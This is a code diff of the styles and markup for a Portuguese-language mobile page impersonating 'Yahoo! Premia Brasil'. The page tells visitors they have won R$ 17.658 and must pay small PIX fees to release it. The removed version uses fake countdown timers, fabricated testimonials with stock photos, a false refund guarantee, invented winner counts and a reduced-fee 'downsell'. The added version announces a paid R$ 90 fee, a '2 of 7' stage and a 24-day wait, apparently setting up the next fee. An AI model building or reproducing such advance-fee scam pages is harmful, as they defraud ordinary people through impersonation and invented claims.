+
+    .price-callout-value {
+      font-size: 38px;
+      font-weight: 900;
+      color: #2563eb;
+      letter-spacing: -0.8px;
+      line-height: 1.1;
+    }
+
+    /* CTA Button */
+    .btn-checkout-cta {
+      width: 100%;
+      background: #059669;
       color: #ffffff;
+      border: none;
+      padding: 16px 20px;
+      border-radius: 12px;
+      font-size: 14.5px;
+      font-weight: 900;
+      letter-spacing: 0.3px;
+      text-transform: uppercase;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      text-decoration: none;
+      box-shadow: 0 4px 14px rgba(5, 150, 105, 0.35);
+      transition: background-color 0.15s ease, transform 0.1s ease, box-shadow 0.15s ease;
     }
 
-    .downsell-info-inner .strikethrough-old {
-      color: #ef4444;
-      text-decoration: line-through;
-      font-weight: 700;
+    .btn-checkout-cta:hover {
+      background: #047857;
+      box-shadow: 0 6px 18px rgba(5, 150, 105, 0.45);
     }
 
-    /* Comparison rows */
-    .downsell-comparison-group {
+    .btn-checkout-cta:active {
+      transform: scale(0.985);
+      background: #065f46;
+    }
+
+    /* Resumo da Transação Card */
+    .summary-card {
+      background: #ffffff;
+      border: 1px solid #e2e8f0;
+      border-radius: 16px;
+      padding: 18px 18px 16px;
+    }
+
+    .summary-title {
+      font-size: 11.5px;
+      font-weight: 900;
+      color: #0f172a;
+      letter-spacing: 0.6px;
+      text-transform: uppercase;
+      margin-bottom: 14px;
+    }
+
+    .summary-list {
       display: flex;
       flex-direction: column;
       gap: 12px;
-      margin-top: 18px;
     }
 
-    .downsell-compare-row {
+    .summary-row {
       display: flex;
-      align-items: center;
       justify-content: space-between;
-      border-radius: 14px;
-      padding: 14px 16px;
-    }
-
-    .downsell-row-expired {
-      background: rgba(239, 68, 68, 0.04);
-      border: 1.5px dashed #7f1d1d;
-    }
-
-    .downsell-row-active {
-      background: rgba(16, 185, 129, 0.08);
-      border: 1.5px solid #059669;
-      box-shadow: 0 0 20px rgba(16, 185, 129, 0.15);
-    }
-
-    .downsell-row-left {
-      display: flex;
-      flex-direction: column;
-      gap: 3px;
-    }
-
-    .downsell-row-label-red {
-      font-size: 12px;
-      font-weight: 800;
-      color: #f87171;
-      display: flex;
       align-items: center;
-      gap: 5px;
-      text-transform: uppercase;
-    }
-
-    .downsell-row-subtext {
-      font-size: 11px;
-      color: #64748b;
-    }
-
-    .downsell-row-price-striked {
-      font-size: 17px;
-      font-weight: 800;
-      color: #64748b;
-      text-decoration: line-through;
-    }
-
-    .downsell-row-label-green {
-      font-size: 12px;
-      font-weight: 800;
-      color: #34d399;
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      text-transform: uppercase;
-    }
-
-    .downsell-row-price-active {
-      font-size: 21px;
-      font-weight: 900;
-      color: #ffffff;
-      letter-spacing: -0.3px;
-    }
-
-    /* Price highlight */
-    .downsell-pricing-callout {
-      text-align: center;
-      margin-top: 24px;
-    }
-
-    .downsell-striked-top {
       font-size: 12.5px;
-      color: #64748b;
-      text-decoration: line-through;
+      color: #475569;
     }
 
-    .downsell-promo-tag {
-      font-size: 12px;
-      font-weight: 800;
-      color: #34d399;
-      letter-spacing: 0.5px;
-      text-transform: uppercase;
-      margin-top: 4px;
-    }
-
-    .downsell-huge-price {
+    .summary-row-label {
       display: flex;
-      align-items: baseline;
-      justify-content: center;
-      gap: 4px;
-      margin: 4px 0 6px;
-    }
-
-    .downsell-huge-price .rs-prefix {
-      font-size: 26px;
-      font-weight: 900;
-      color: #facc15;
-    }
-
-    .downsell-huge-price .val {
-      font-size: 54px;
-      font-weight: 900;
-      color: #ffffff;
-      line-height: 1;
-      letter-spacing: -1.5px;
-    }
-
-    .downsell-price-sub {
-      font-size: 12px;
-      color: #94a3b8;
-    }
-
-    /* Green Main Button on Downsell */
-    .btn-downsell-cta {
-      margin-top: 18px;
-      width: 100%;
-      background: linear-gradient(180deg, #10b981 0%, #059669 100%);
-      color: #ffffff;
-      border: none;
-      padding: 18px 14px;
-      border-radius: 16px;
-      cursor: pointer;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      box-shadow: 0 0 28px rgba(16, 185, 129, 0.4), 0 4px 12px rgba(5, 150, 105, 0.4);
-      transition: transform 0.12s ease, filter 0.15s ease;
-    }
-
-    .btn-downsell-cta:hover {
-      filter: brightness(1.06);
-    }
-
-    .btn-downsell-cta:active {
-      transform: scale(0.985);
-    }
-
-    .btn-downsell-title {
-      font-size: 14.5px;
-      font-weight: 900;
-      letter-spacing: 0.2px;
-      text-transform: uppercase;
-    }
-
-    .btn-downsell-subtitle {
-      font-size: 11px;
-      font-weight: 600;
-      color: #d1fae5;
-      margin-top: 4px;
-      opacity: 0.95;
-    }
-
-    /* Trust Footer items */
-    .downsell-trust-footer {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 16px;
-      margin-top: 22px;
-      font-size: 11.5px;
-      color: #94a3b8;
-      flex-wrap: wrap;
-    }
-
-    .downsell-trust-footer span {
-      display: inline-flex;
       align-items: center;
       gap: 6px;
     }
 
-    .downsell-final-reject-link {
-      display: block;
-      text-align: center;
+    .summary-row-val {
+      font-weight: 700;
+      color: #0f172a;
+    }
+
+    .badge-paid-green {
+      background: #dcfce7;
+      color: #15803d;
       font-size: 11px;
-      color: #475569;
-      text-decoration: underline;
-      cursor: pointer;
-      margin-top: 16px;
-      transition: color 0.15s ease;
-      line-height: 1.4;
+      font-weight: 800;
+      padding: 4px 10px;
+      border-radius: 6px;
+      letter-spacing: 0.3px;
     }
 
-    .downsell-final-reject-link:hover {
-      color: #64748b;
+    .summary-divider {
+      height: 1px;
+      background: #e2e8f0;
+      margin: 14px 0 12px;
     }
 
-    footer {
-      text-align: center;
-      font-size: 10px;
+    .summary-total-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .summary-total-label {
+      font-size: 13.5px;
+      font-weight: 800;
+      color: #0f172a;
+    }
+
+    .summary-total-val {
+      font-size: 19px;
+      font-weight: 900;
+      color: #2563eb;
+      letter-spacing: -0.3px;
+    }
+
+    /* Comments Section */
+    .comments-wrapper {
+      margin-top: 4px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .comments-section-title {
+      font-size: 14px;
+      font-weight: 800;
+      color: #0f172a;
+    }
+
+    .comment-card {
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 14px;
+      padding: 14px 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .comment-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .comment-avatar {
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      object-fit: cover;
+      flex-shrink: 0;
+      background: #e2e8f0;
+    }
+
+    .comment-author-info h4 {
+      font-size: 12.5px;
+      font-weight: 800;
+      color: #0f172a;
+      line-height: 1.2;
+    }
+
+    .comment-author-info span {
+      font-size: 10.5px;
       color: #94a3b8;
+    }
+
+    .comment-body {
+      font-size: 12px;
+      color: #334155;
       line-height: 1.5;
-      padding: 10px 0 15px;
+    }
+
+    .comment-actions {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      font-size: 11px;
+      color: #64748b;
+      font-weight: 600;
+    }
+
+    .comment-action-btn {
+      background: none;
+      border: none;
+      color: inherit;
+      font-size: inherit;
+      font-weight: inherit;
+      cursor: pointer;
+      padding: 0;
+    }
+
+    .comment-action-btn:hover {
+      color: #0f172a;
+    }
+
+    .comment-like-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      color: #e11d48;
+      font-weight: 700;
+    }
+
+    /* Legal Disclaimer Footer */
+    .legal-disclaimer {
+      font-size: 9.5px;
+      line-height: 1.6;
+      color: #94a3b8;
+      text-align: justify;
+      padding-top: 10px;
+      border-top: 1px solid #f1f5f9;
+    }
+
+    .legal-disclaimer strong {
+      color: #64748b;
+      font-weight: 700;
+    }
+
+    /* Responsive adjustment for small mobile displays */
+    @media (max-width: 360px) {
+      .page-wrapper {
+        padding: 20px 14px 28px;
+      }
+      .main-title {
+        font-size: 22px;
+      }
+      .price-callout-value {
+        font-size: 32px;
+      }
+      .btn-checkout-cta {
+        font-size: 13.5px;
+      }
     }
   </style>
 </head>
 <body>
 
-  <div class="container" id="mainContentView">
+  <!-- Main Container -->
+  <main class="page-wrapper">
 
-    <!-- Top Badge -->
-    <div class="top-badge">
-      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
-      Saque Yahoo! Premia Liberado
-    </div>
-
-    <!-- Header Text -->
-    <div class="header-text">
-      <h1>Seu saque de <span>R$ 17.658</span> do Yahoo! Premia pode ser liberado ainda hoje</h1>
-      <p>O sistema já processou os seus ganhos. O saldo de <strong>R$ 17.658,00</strong> está <strong>reservado na central</strong>, aguardando apenas a sua validação final para ser enviado.</p>
-    </div>
-
-    <!-- Timer Box -->
-    <div class="timer-pill">
-      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
-      Tempo limite de liberação: <strong id="topTimer">09:51</strong>
-    </div>
-
-    <!-- Trust Chips -->
-    <div class="trust-chips">
-      <div class="chip">
-        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-        100% Seguro
-      </div>
-      <div class="chip">
-        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
-        PIX em minutos
-      </div>
-      <div class="chip">
-        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-        Dados protegidos
-      </div>
-    </div>
-
-    <!-- Alert Card -->
-    <div class="card card-border-red">
-      <h3 class="card-title">Atenção: Ação Obrigatória</h3>
-      <p style="font-size: 12px; color: #475569; line-height: 1.4;">
-        Esse valor só será liberado se você <strong>confirmar ainda hoje</strong>. Se não validar dentro do prazo, o sistema automaticamente:
-      </p>
-      <ul class="warning-list">
-        <li>
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="#ef4444" stroke="#ffffff" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
-          Bloqueia o saque sorteado pelo Yahoo! Premia Brasil
-        </li>
-        <li>
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="#ef4444" stroke="#ffffff" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
-          Devolve os R$ 17.658,00 ao fundo dos próximos sorteios
-        </li>
-        <li>
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="#ef4444" stroke="#ffffff" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
-          Encerra sua prioridade de acesso na campanha
-        </li>
-        <li>
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="#ef4444" stroke="#ffffff" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
-          Impede qualquer liberação posterior do valor
-        </li>
-      </ul>
-    </div>
-
-    <!-- Purple Explanation Card -->
-    <div class="purple-card">
-      <div class="purple-badge">Certificação de Ganhos</div>
-      <h2>De onde vem este valor de R$ 17.658?</h2>
-      <p>
-        O <strong>Yahoo! Premia</strong> repassa aos usuários contemplados os valores das campanhas semanais. O saldo já foi processado no seu nome e a legislação exige que <strong>100% deste montante</strong> seja repassado para si. O dinheiro não é aleatório, é <strong>resultado</strong>.
-      </p>
-    </div>
-
-    <!-- Guarantee List Card -->
-    <div class="card">
-      <h3 class="card-title" style="margin-bottom: 14px;">Ao confirmar agora, você garante:</h3>
-      <div class="features-list">
-        <div class="feature-item">
-          <svg class="icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-5"/></svg>
-          <div>
-            <h3>Saque Integral (R$ 17.658,00)</h3>
-            <p>Transferido direto para sua chave PIX, sem deduções.</p>
-          </div>
-        </div>
-        <div class="feature-item">
-          <svg class="icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-5"/></svg>
-          <div>
-            <h3>Participação VIP nos próximos sorteios</h3>
-            <p>Sua conta segue ativa nos sorteios semanais.</p>
-          </div>
-        </div>
-        <div class="feature-item">
-          <svg class="icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-5"/></svg>
-          <div>
-            <h3>Grupo VIP dos Contemplados</h3>
-            <p>Acesso ao grupo exclusivo dos sorteados desta temporada.</p>
-          </div>
-        </div>
-        <div class="feature-item">
-          <svg class="icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-5"/></svg>
-          <div>
-            <h3>Suporte oficial direto</h3>
-            <p>Atendimento prioritário da equipe oficial.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <!-- Steps Card -->
-    <div class="card">
-      <h3 class="section-headline">Passo a passo para liberar o seu saque:</h3>
-      <div class="steps-list">
-        <div class="step-box">
-          <div class="step-num">1</div>
-          <div class="step-content">
-            <h4>Aperte no Botão Verde</h4>
-            <p>Inicie o processo rolando a tela para baixo e clicando em "Pagar R$ 97 e Sacar".</p>
-          </div>
-        </div>
-        <div class="step-box">
-          <div class="step-num">2</div>
-          <div class="step-content">
-            <h4>Cadastre sua Chave PIX</h4>
-            <p>Informe exatamente a chave para onde o sistema deve transferir o dinheiro.</p>
-          </div>
-        </div>
-        <div class="step-box">
-          <div class="step-num">3</div>
-          <div class="step-content">
-            <h4>Efetue o Pagamento de Segurança</h4>
-            <p>Preencha seus dados de pagamento no checkout e pague a taxa única antifraude.</p>
-          </div>
-        </div>
-        <div class="step-box">
-          <div class="step-num">4</div>
-          <div class="step-content">
-            <h4>Saldo Cai na Conta</h4>
-            <p>Após a confirmação da taxa, os R$ 17.658 são depositados automaticamente no seu banco.</p>
-          </div>
-        </div>
-      </div>
-      <div class="note-box">
-        <strong>Atenção:</strong> Apenas gerar a chave PIX e não efetuar o pagamento da taxa não lhe dá direito ao saldo. A liberação ocorre estritamente após a baixa do pagamento.
-      </div>
-    </div>
-
-    <!-- Payment / Checkout Card -->
-    <div class="pay-card">
-      <div class="receipt-header">Extrato de Liberação</div>
-      <div class="receipt-line">
-        <span>Saldo a Transferir</span>
-        <strong style="color: #ca8a04;">R$ 17.658,00</strong>
-      </div>
-      <div class="receipt-line">
-        <span>Taxa de Validação de Dados</span>
-        <strong style="color: #dc2626;">- R$ 97,00</strong>
-      </div>
-
-      <p style="font-size: 11.5px; color: #64748b; margin-top: 14px;">
-        Para que o sistema libere o seu PIX gigante de <strong>R$ 17.658,00</strong>, o gateway exige o pagamento da taxa de validação no valor de:
-      </p>
-
-      <div class="highlight-price">R$ 97,00</div>
-
-      <button class="btn-green trigger-pix-modal" type="button">
-        <!-- Ícone de Carteira (Wallet) -->
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-          <path d="M21 12V7a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-5z"/>
-          <path d="M16 12h5a1 1 0 0 0 1-1V9a1 1 0 0 0-1-1h-5a2 2 0 0 0-2 2v0a2 2 0 0 0 2 2z"/>
-          <circle cx="18.5" cy="10" r="0.9" fill="currentColor"/>
-        </svg>
-        <span>Pagar R$ 97 e Sacar R$ 17.658 Agora</span>
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="9 18 15 12 9 6"/></svg>
-      </button>
-
-      <div class="btn-sub">
-        <span>● PIX</span>
-        <span>🛡 Gateway Seguro</span>
-      </div>
-    </div>
-
-    <!-- Guarantee Box -->
-    <div class="card">
-      <h3 class="card-title">Garantia de Devolução Rápida</h3>
-      <p style="font-size: 12px; color: #475569; line-height: 1.4;">
-        Se o seu PIX de <strong>R$ 17.658</strong> não cair na conta em até <strong>3 minutos</strong> após o pagamento, a taxa de <strong>R$ 97</strong> é devolvida automaticamente para você, sem perguntas.
-      </p>
-      <div class="status-alert">
-        <div class="green-dot"></div>
-        <div><strong>+18.547 contemplados nesta semana</strong><br><span style="color: #64748b;">já confirmaram e receberam seus prêmios · ao vivo</span></div>
-      </div>
-    </div>
-
-    <!-- Testimonials -->
-    <div class="card">
-      <div style="text-align: center; margin-bottom: 12px;">
-        <span style="font-size: 10px; font-weight: 700; color: #16a34a; text-transform: uppercase;">Quem já confirmou, recomenda</span>
-        <h3 class="card-title" style="margin-top: 4px;">Histórias Reais de Quem Foi Sorteado</h3>
-      </div>
-
-      <!-- User 1 -->
-      <div class="testimonial">
-        <div class="testimonial-user">
-          <img class="avatar" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=120&auto=format&fit=crop&q=80" alt="Ana Beatriz">
-          <div class="testimonial-meta">
-            <h5>Ana Beatriz</h5>
-            <div class="stars">★★★★★ <span style="color: #94a3b8;">· Há 2 min</span></div>
-          </div>
-        </div>
-        <p class="testimonial-text">Achei que era brincadeira, mas resolvi confirmar. Em poucos minutos a notificação do banco apareceu com os R$ 17.658,00! 🙏🥳</p>
-      </div>
-
-      <!-- User 2 -->
-      <div class="testimonial">
-        <div class="testimonial-user">
-          <img class="avatar" src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=120&auto=format&fit=crop&q=80" alt="Rafael Torres">
-          <div class="testimonial-meta">
-            <h5>Rafael Torres</h5>
-            <div class="stars">★★★★★ <span style="color: #94a3b8;">· Há 5 min</span></div>
-          </div>
-        </div>
-        <p class="testimonial-text">Recebi a mensagem dos sorteios semanais e fui contemplado essa semana. Confirmei meus dados e o Nubank apitou com o PIX!!!</p>
-      </div>
-
-      <!-- User 3 -->
-      <div class="testimonial">
-        <div class="testimonial-user">
-          <img class="avatar" src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=120&auto=format&fit=crop&q=80" alt="Marcos Silva">
-          <div class="testimonial-meta">
-            <h5>Marcos Silva</h5>
-            <div class="stars">★★★★★ <span style="color: #94a3b8;">· Há 12 min</span></div>
-          </div>
-        </div>
-        <p class="testimonial-text">Sistema confiável. Validei a chave PIX e o desbloqueio foi automático. Vale demais ser contemplado.</p>
-      </div>
-
-      <!-- User 4 -->
-      <div class="testimonial">
-        <div class="testimonial-user">
-          <img class="avatar" src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=120&auto=format&fit=crop&q=80" alt="Simone Albuquerque">
-          <div class="testimonial-meta">
-            <h5>Simone Albuquerque</h5>
-            <div class="stars">★★★★★ <span style="color: #94a3b8;">· Há 18 min</span></div>
-          </div>
-        </div>
-        <p class="testimonial-text">Já caí em muito golpe, mas a garantia me deu segurança. Saque liberado direto na chave do meu CPF.</p>
-      </div>
-
-      <!-- User 5 -->
-      <div class="testimonial">
-        <div class="testimonial-user">
-          <img class="avatar" src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&auto=format&fit=crop&q=80" alt="Juliana Mendes">
-          <div class="testimonial-meta">
-            <h5>Juliana Mendes</h5>
-            <div class="stars">★★★★★ <span style="color: #94a3b8;">· Há 25 min</span></div>
-          </div>
-        </div>
-        <p class="testimonial-text">Tava tremendo, mas 2 minutos depois a Caixa avisou da transferência. Gratidão por participar!</p>
-      </div>
-
-      <!-- User 6 -->
-      <div class="testimonial">
-        <div class="testimonial-user">
-          <img class="avatar" src="https://images.unsplash.com/photo-1522075469751-3a6694fb2f61?w=120&auto=format&fit=crop&q=80" alt="Fernando Costa">
-          <div class="testimonial-meta">
-            <h5>Fernando Costa</h5>
-            <div class="stars">★★★★★ <span style="color: #94a3b8;">· Há 33 min</span></div>
-          </div>
-        </div>
-        <p class="testimonial-text">Confirmei agora! Vou poder quitar o carro. Obrigado Yahoo! Premia Brasil.</p>
-      </div>
-    </div>
-
-    <!-- FAQ Section -->
-    <div style="text-align: center; margin-top: 8px;">
-      <span style="font-size: 11px; font-weight: 700; color: #16a34a; letter-spacing: 0.5px; text-transform: uppercase;">Dúvidas Frequentes</span>
-      <h3 style="font-size: 22px; font-weight: 900; color: #0f172a; margin-top: 4px; display: flex; align-items: center; justify-content: center; gap: 8px;">
-        <span style="color: #ec4899;">❓</span> FAQ
-      </h3>
-    </div>
-
-    <div class="faq-container">
-      
-      <!-- FAQ 1 -->
-      <div class="faq-item active">
-        <button class="faq-header" type="button" aria-expanded="true">
-          <span>1. Como sei que fui realmente sorteado(a)?</span>
-          <svg class="faq-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-            <polyline points="6 9 12 15 18 9"/>
+    <!-- 1. Top Status Card -->
+    <section class="status-card" aria-label="Status de Liberação">
+      <div class="status-header">
+        <span>STATUS DE LIBERAÇÃO <span class="step-highlight">ETAPA 2 DE 7</span></span>
+        <span class="status-badge">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"></polyline>
           </svg>
-        </button>
-        <div class="faq-body" style="max-height: 180px;">
-          <div class="faq-content">
-            Seu e-mail foi selecionado entre milhares de contas Yahoo ativas no Brasil nesta semana. Ao confirmar seus dados, validamos que a participação corresponde ao e-mail contemplado.
-          </div>
-        </div>
+          1 Concluída
+        </span>
       </div>
 
-      <!-- FAQ 2 -->
-      <div class="faq-item">
-        <button class="faq-header" type="button" aria-expanded="false">
-          <span>2. É seguro informar meus dados aqui?</span>
-          <svg class="faq-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-            <polyline points="6 9 12 15 18 9"/>
-          </svg>
-        </button>
-        <div class="faq-body">
-          <div class="faq-content">
-            Sim. A página opera com conexão criptografada de ponta a ponta (256-bit) e seus dados são usados apenas para validar o sorteio e liberar o PIX na sua chave.
-          </div>
-        </div>
+      <div class="progress-bar-track">
+        <div class="progress-bar-fill"></div>
       </div>
 
-      <!-- FAQ 3 -->
-      <div class="faq-item">
-        <button class="faq-header" type="button" aria-expanded="false">
-          <span>3. Quanto tempo o PIX leva para cair?</span>
-          <svg class="faq-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-            <polyline points="6 9 12 15 18 9"/>
-          </svg>
-        </button>
-        <div class="faq-body">
-          <div class="faq-content">
-            Após a confirmação dos dados e o cadastro da chave PIX, o envio é automatizado e o valor cai em média entre 5 e 10 minutos.
-          </div>
-        </div>
+      <div class="status-footer">
+        Faltam: 5 etapas
       </div>
+    </section>
 
-      <!-- FAQ 4 -->
-      <div class="faq-item">
-        <button class="faq-header" type="button" aria-expanded="false">
-          <span>4. Os sorteios são semanais?</span>
-          <svg class="faq-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-            <polyline points="6 9 12 15 18 9"/>
-          </svg>
-        </button>
-        <div class="faq-body">
-          <div class="faq-content">
-            Sim. Toda semana selecionamos contemplados entre milhares de contas Yahoo ativas no Brasil.
-          </div>
-        </div>
-      </div>
-
-      <!-- FAQ 5 -->
-      <div class="faq-item">
-        <button class="faq-header" type="button" aria-expanded="false">
-          <span>5. Posso confirmar pelo celular?</span>
-          <svg class="faq-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-            <polyline points="6 9 12 15 18 9"/>
-          </svg>
-        </button>
-        <div class="faq-body">
-          <div class="faq-content">
-            Sim. A confirmação funciona em qualquer dispositivo, sem instalar nada.
-          </div>
-        </div>
-      </div>
-
-    </div>
-
-    <!-- Bottom Box -->
-    <div class="card" style="text-align: center; padding: 24px 18px;">
-      
-      <!-- Logo Oficial do Yahoo! -->
-      <div class="yahoo-logo-container">
-        <img 
-          class="yahoo-img" 
-          src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Yahoo%21_%282019%29.svg/1280px-Yahoo%21_%282019%29.svg.png" 
-          alt="Yahoo!"
-          loading="lazy"
-          onerror="this.onerror=null; this.src='https://upload.wikimedia.org/wikipedia/commons/3/3a/Yahoo%21_%282019%29.svg';"
-        >
-      </div>
-
-      <div class="pill-red">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
-        Tempo restante: <span id="bottomTimer">09:51</span>
-      </div>
-
-      <p style="font-size: 11.5px; color: #475569; line-height: 1.4; margin-bottom: 12px;">
-        Se você sair desta página sem confirmar, o Yahoo! vai devolver o valor ao fundo interno e encerrar sua prioridade de saque.
-      </p>
-
-      <h3 style="font-size: 16px; font-weight: 900; color: #0f172a; margin-bottom: 6px;">
-        O SALDO JÁ ESTÁ NO YAHOO!
-      </h3>
-
-      <p style="font-size: 11.5px; color: #64748b; margin-bottom: 16px;">
-        Ele já foi acumulado. Ele já está no seu nome. Agora só falta você liberar o saque.
-      </p>
-
-      <!-- Botão com ícone de Carteira -->
-      <button class="btn-green trigger-pix-modal" type="button">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-          <path d="M21 12V7a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-5z"/>
-          <path d="M16 12h5a1 1 0 0 0 1-1V9a1 1 0 0 0-1-1h-5a2 2 0 0 0-2 2v0a2 2 0 0 0 2 2z"/>
-          <circle cx="18.5" cy="10" r="0.9" fill="currentColor"/>
-        </svg>
-        <span>LIBERAR MEU SAQUE DE R$17.658 AGORA</span>
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="9 18 15 12 9 6"/></svg>
-      </button>
-    </div>
-
-    <!-- Footer -->
-    <footer>
-      © Yahoo! Premia Brasil · premiacoes@yahoo.com · Campanha promocional · Termos aplicáveis
-    </footer>
-
-  </div>
-
-  <div id="downsellView">
-    
-    <!-- Top Amber Badge -->
-    <div class="downsell-top-badge">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
-        <line x1="12" y1="9" x2="12" y2="13"/>
-        <line x1="12" y1="17" x2="12.01" y2="17"/>
+    <!-- 2. Taxa de Cadastro Paga Pill -->
+    <div class="taxa-paga-pill">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 6 9 17 4 12"></polyline>
       </svg>
-      RECLASSIFICAÇÃO BANCÁRIA · COTA EXPRESS ATIVADA
+      TAXA DE CADASTRO PAGA (R$ 90)
     </div>
 
-    <!-- Official Yahoo Logo -->
-    <div class="downsell-logo-wrap">
-      <img 
-        class="downsell-logo-img" 
-        src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Yahoo%21_%282019%29.svg/1280px-Yahoo%21_%282019%29.svg.png" 
-        alt="Yahoo!"
-        onerror="this.onerror=null; this.src='https://upload.wikimedia.org/wikipedia/commons/3/3a/Yahoo%21_%282019%29.svg';"
-      >
-    </div>
-
-    <!-- Headline and Subtext -->
-    <div class="downsell-headline-box">
-      <h1 class="downsell-title">
-        Sua Cota foi ajustada para <span>R$ 8.420,00</span>
+    <!-- 3. Headline & Description -->
+    <header class="main-hero-text">
+      <h1 class="main-title">
+        Seu saque de <span class="amount-highlight">R$ 17.658,00</span> está na fila de espera.
       </h1>
-      <p class="downsell-desc">
-        A vaga do prêmio máximo foi repassada. Seu cadastro foi realocado para a <strong>Cota Express</strong> com taxa proporcional reduzida.
+      <p class="main-description">
+        Você pagou a taxa inicial com sucesso. No entanto, por causa da alta demanda do <strong>Yahoo! Premia</strong>, o prazo normal de envio gratuito é de <span class="danger-highlight">24 dias úteis</span>.
       </p>
-    </div>
+    </header>
 
-    <!-- Gold Countdown Card -->
-    <div class="downsell-timer-card">
-      <div class="downsell-timer-title">
-        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
-          <circle cx="12" cy="12" r="10"/>
-          <polyline points="12 6 12 12 16 14"/>
-        </svg>
-        TEMPO RESTANTE PARA VALIDAR A COTA EXPRESS:
